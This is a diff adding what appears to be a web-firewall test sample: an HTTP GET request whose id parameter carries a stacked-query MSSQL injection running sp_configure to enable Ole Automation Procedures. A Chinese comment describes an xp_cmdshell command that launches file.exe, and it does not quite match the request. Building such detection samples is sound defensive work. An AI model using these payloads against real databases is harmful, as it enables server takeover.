@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_普通注入-06506407
+# 攻击者基于堆叠查询，将"exec master.dbo.xp_cmdshell 'cd c:/www & file.exe'"语句注入到 SQL 查询参数中，攻击者通过此sql语句可以设置Ole Automation Procedures的值为1。
+GET /?id=1%3Bexec%20sp_configure%20%27Ole%20Automation%20Procedures%27%2C%201&bid=hd_tag_m8mv23mq HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23mq
+RM-PRO-Token: 8d98ff9473f4992e00d9d76ed08a9c2f
+RM-PRO-Time: 1742808332031
+User-Agent: curl/7.83.1
+
